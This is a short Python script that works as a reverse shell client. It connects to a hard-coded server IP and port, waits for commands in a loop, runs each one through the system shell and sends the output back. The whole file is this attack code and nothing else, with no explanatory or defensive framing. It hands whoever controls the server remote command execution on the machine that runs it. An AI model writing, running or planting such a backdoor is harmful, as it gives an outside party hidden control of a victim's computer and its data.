import socket
import os
import subprocess

s = socket.socket()
host = "192.168.18.183"  # Change to your server's IP address
port = 9999  # Change to your server's port
s.connect((host, port))

while True:
    command = s.recv(1024)
    if command[:2].decode("utf-8") == "cd":
        os.chdir(command[3:].decode("utf-8"))
    output = subprocess.run(command, shell=True, capture_output=True)
    s.send(output.stdout + output.stderr)

s.close() 